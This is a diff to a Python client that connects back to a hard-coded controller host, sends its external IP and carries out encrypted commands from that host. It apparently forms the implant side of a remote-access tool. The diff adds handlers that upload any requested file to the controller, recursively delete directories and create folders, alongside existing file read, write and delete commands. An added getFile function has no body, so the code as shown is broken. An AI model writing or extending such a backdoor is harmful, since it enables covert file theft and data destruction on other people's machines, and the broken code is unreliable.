@@ -2,6 +2,8 @@ import socket
 import requests
 import os
 from Crypto.Cipher import AES
+import shutil
+import os
 
 #secret_key = os.urandom(BLOCK_SIZE) i generated once and i will use that always
 secret_key=b'b\x90\xf7\x1d\\KY\xc3\xd7\x13\xf1\x90\xba\xe4HS\xe3\xce\x1cd\x8f\xdf\xda\xc8u\xa9B\x85-&<\xb7'
@@ -13,7 +15,7 @@ def unpadding(message):
         return message
 
 def padding(message):
-        while(len(message)%16!=0):
+        while(len(message.encode())%16!=0):
             message = message +" "
         return  message.encode()
     
@@ -96,7 +98,6 @@ def readFile(con,receiving_message):
 
 def writeToFile(con,received_message):
     filename = received_message[6:]
-    print("HELLO THIS IS " + filename)
     #Build a text message until close is send
     try:
         file_len = int(decryption(con.recv(1024)))
@@ -116,26 +117,81 @@ def writeToFile(con,received_message):
         sending_message = str(e)
     finally:
         file.close()    
-        return sending_message  
+        return sending_message
+
+def makeDirectories(receiving_message):
+    try:
+        os.makedirs(receiving_message[8:])
+        sending_message = "Directory created."
+    except Exception as e:
+        sending_message="Exception: " + str(e) 
+    finally:
+        return sending_message
+
+def removeDirectories(receiving_message):
+    try:
+        shutil.rmtree(receiving_message[10:])
+        sending_message = 'Directory  deleted.'
+    except Exception as e:
+        sending_message="Exception: " + str(e) 
+    finally:
+        return sending_message
+    
+#  we need a way to encryp files
+def sendFile(con,received_message):
+    try:
+        filename = received_message[9:] 
+        if(os.path.exists(filename)):
         
+            #sending the filesize
+            total = os.path.getsize(filename)
+            padded_message = padding(str(total))
+            sending_message = encryption(padded_message)
+            con.sendall(sending_message)
+    
+            f = open(filename,'rb')
+            l = f.read(4096)
+            while (l):
+                con.send(l)
+                print('Sent ',repr(l))
+                l = f.read(4096)
+            sending_message = "Done"
+        else:
+            sending_message = filename + " does not exist."
+    except Exception as e:
+        sending_message="Exception: " + str(e) 
+    finally:
+        try:
+            f.close()
+        except:
+            pass
+        return sending_message
+
+def getFile(con,received_message):
+
+
+
+def getIp():
+    try:
+        url = 'http://www.myexternalip.com/raw'
+        r = requests.get(url)
+        sending_message=("Connecting from: %s" %(r.text))
+    except Exception as e:
+        sending_message = "Failed to get the ip. with error: " + str(e)
+    return  sending_message
+    
+
 def client():
 
     #Creating the socket passing the ip and port as parameters and trying to connect
-    host = "192.168.2.6"
+    host = "192.168.2.8"
     port = 5000
     con = socket.socket()
     con.connect((host,port))
     received_message=""
     #Sending the first message with the ip of the client
-    try:
-        url = 'http://www.myexternalip.com/raw'
-        r = requests.get(url)
-        sending_message=("Connecting from: %s" %(r.text))
-    except Exception e:
-        ip = "Failed to get the ip. with error: " + str(e)
-        sending_message="Failed to obtain ip address"
     #makes the message a mulpiplier of 16 then encrypts it and sends it.
-    con.send(encryption(padding(sending_message)))
+    con.send(encryption(padding(getIp())))
 
     
     while received_message != 'close_this_socket':
@@ -155,6 +211,8 @@ def client():
            sending_message = changeDirectory(received_message)
         elif received_message == "dir":
            sending_message = listOfFilesAndFolders()
+        elif received_message[0:9] == "removedir": 
+           sending_message = removeDirectories(received_message)
         elif received_message[0:6] == "remove":
            sending_message = deleteFile(received_message)
         elif received_message[0:6] == "create":
@@ -165,12 +223,20 @@ def client():
            sending_message = readFile(con,received_message)
         elif received_message[0:5] == "write":
            sending_message = writeToFile(con,received_message)
+        elif received_message[0:7] == "makedir":
+           sending_message = makeDirectories(received_message)
+        elif(received_message[0:8]=="download"):
+           sending_message = sendFile(con,received_message)
+        elif(received_message=="ip"):
+           sending_message = getIp()
         else:
-           sending_message = received_message     
-        print(sending_message)
+           sending_message = "use help"     
+        
         
         #client send back data
-        sending_message = encryption(padding(sending_message))
+        padded_message = padding(sending_message)
+        print(" this is message len" ,len(padded_message))
+        sending_message = encryption(padded_message)
         con.send(encryption(padding(str(len(sending_message)))))
         con.sendall(sending_message)
 
